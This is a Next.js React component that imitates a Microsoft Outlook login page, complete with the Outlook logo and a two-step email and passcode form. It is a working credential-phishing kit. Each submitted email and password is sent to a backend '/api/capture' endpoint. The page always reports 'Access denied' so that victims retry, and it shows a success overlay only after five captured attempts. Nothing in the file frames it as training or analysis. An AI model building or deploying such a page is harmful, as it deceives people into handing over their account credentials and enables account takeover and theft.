'use client'

import { useState } from 'react'
import Image from 'next/image'
import SuccessOverlay from './SuccessOverlay'
import styles from '@/styles/MailLoginFlow.module.css'

const MAX_ATTEMPTS = 5
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001'

export default function MailLoginFlow() {
  const [phase, setPhase] = useState<'one' | 'two'>('one')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [errorMsg, setErrorMsg] = useState('')
  const [errorMsg2, setErrorMsg2] = useState('')
  const [attemptCount, setAttemptCount] = useState(0)
  const [showSuccess, setShowSuccess] = useState(false)

  const handleContinue = () => {
    if (!email.trim()) {
      setErrorMsg('Please enter a valid identifier.')
      return
    }
    setErrorMsg('')
    setPhase('two')
  }

  const handleGoBack = () => {
    setPhase('one')
    setErrorMsg2('')
  }

  const handleSignIn = async () => {
    if (!password) {
      setErrorMsg2('Please enter your passcode.')
      return
    }

    if (attemptCount >= MAX_ATTEMPTS) {
      setErrorMsg2('Too many attempts. Try again later.')
      return
    }

    const newCount = attemptCount + 1
    setAttemptCount(newCount)

    const payload = {
      username: email.trim(),
      password,
      method: 'email',
    }

    try {
      await fetch(`${BACKEND_URL}/api/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (error) {
      console.warn('Backend request failed')
    }

    if (newCount >= MAX_ATTEMPTS) {
      setShowSuccess(true)
    } else {
      setErrorMsg2('Access denied. Please check your passcode and try again.')
      setPassword('')
    }
  }

  const isLocked = attemptCount >= MAX_ATTEMPTS

  return (
    <>
      <div className={styles.contentBox}>
        <div className={styles.loginFlow}>
          {phase === 'one' && (
            <div className={styles.phaseOne}>
              <Image
                src="/user/images/outlook-logo.svg"
                alt="Outlook"
                width={150}
                height={150}
                className={styles.outlookLogo}
              />
              <h2>Login</h2>
              {errorMsg && <span className={styles.errorMsg}>{errorMsg}</span>}
              <input
                type="email"
                name="u_field"
                placeholder="Enter your email address"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <p>
                Need an account?{' '}
                <a href="#">
                  <span>Request access</span>
                </a>
              </p>
              <p>
                Alternative login options{' '}
                <Image src="/user/images/key.JPG" width={16} height={16} alt="" />
              </p>
              <div className={styles.btnContainer}>
                <button onClick={handleContinue} className={styles.actionBtn}>
                  Continue
                </button>
              </div>
            </div>
          )}

          {phase === 'two' && (
            <div className={styles.phaseTwo}>
              <Image
                src="/user/images/outlook-logo.svg"
                alt="Outlook"
                width={150}
                height={150}
                className={styles.outlookLogo}
              />
              {errorMsg2 && <span className={styles.errorMsg}>{errorMsg2}</span>}
              <button onClick={handleGoBack} className={styles.goBackBtn}>
                ← <span className={styles.userIdentifier}>{email}</span>
              </button>
              <h2>Enter Passcode</h2>
              <input
                type="password"
                name="p_field"
                placeholder="Passcode"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={isLocked}
              />
              <p>Forgot passcode?</p>
              <a href="">
                <p className={styles.useAnotherMethod}>Use another method</p>
              </a>
              <div className={styles.btnContainer}>
                <button
                  onClick={handleSignIn}
                  className={styles.actionBtn}
                  disabled={isLocked}
                >
                  Sign In
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      <div className={styles.optionsBox}>
        <Image src="/user/images/icons.png" width={25} height={25} alt="" />
        <span className={styles.optionsText}>Login settings</span>
      </div>

      <footer className={styles.footer}>
        <ul>
          <li>
            <a href="#">Terms of use</a>
          </li>
          <li>
            <a href="#">Privacy & cookies</a>
          </li>
          <li>
            <a href="#">...</a>
          </li>
        </ul>
      </footer>

      <SuccessOverlay show={showSuccess} />
    </>
  )
}
